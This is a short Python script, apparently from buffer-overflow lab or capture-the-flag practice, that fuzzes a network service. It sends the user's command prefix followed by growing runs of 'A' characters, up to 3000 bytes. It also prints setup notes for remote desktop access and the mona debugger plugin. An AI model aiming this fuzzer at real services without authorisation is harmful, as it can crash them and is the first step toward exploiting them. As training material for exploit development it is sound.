#!/usr/bin/python3
import socket, time, sys,traceback
import argparse

"""
##############################################################

	fuzz bof challenges with range(0,3000,100) characters

##############################################################
"""


print("""Connect to your Windows Box\n\n
\txfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.1\n\n
Configure mona:\n\n
\t!mona config -set workingfolder c:\mona\%p\n\n
And check the help message of the service for the prefix.\n
------------\n""")

# parse input args
parser = argparse.ArgumentParser(description="fuzz a service")
parser.add_argument('-s', dest='server', type=str, help='server IP')
parser.add_argument('-p', dest='port', type=int, help='service port')
parser.add_argument('-c', dest='prefix', type=str, help='prefix / command')
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()


# set server / init vars
ip = args.server
port = args.port
timeout = 5
prefix = args.prefix + " " 
buffer = []

# create payloads / test strings
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

# try out test strings / fuzz
for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send((prefix + string + "\r\n").encode())
        s.recv(1024)
        s.close()
    except Exception as e:
        traceback.print_exc()
        print(e)
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)

